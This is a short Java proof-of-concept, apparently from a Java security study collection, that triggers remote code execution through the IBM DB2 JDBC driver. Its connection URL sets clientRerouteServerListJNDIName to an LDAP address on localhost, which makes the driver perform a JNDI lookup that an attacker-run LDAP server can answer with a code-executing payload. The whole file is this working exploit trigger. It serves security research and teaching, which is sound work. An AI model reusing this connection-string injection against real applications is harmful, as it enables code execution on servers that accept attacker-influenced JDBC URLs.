package com.javasec.jdbc.DB2;

import java.sql.DriverManager;

public class DB2JDBCRCE {
    public static void main(String[] args) throws Exception {
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        DriverManager.getConnection("jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/fgfhjn;");
    }
}
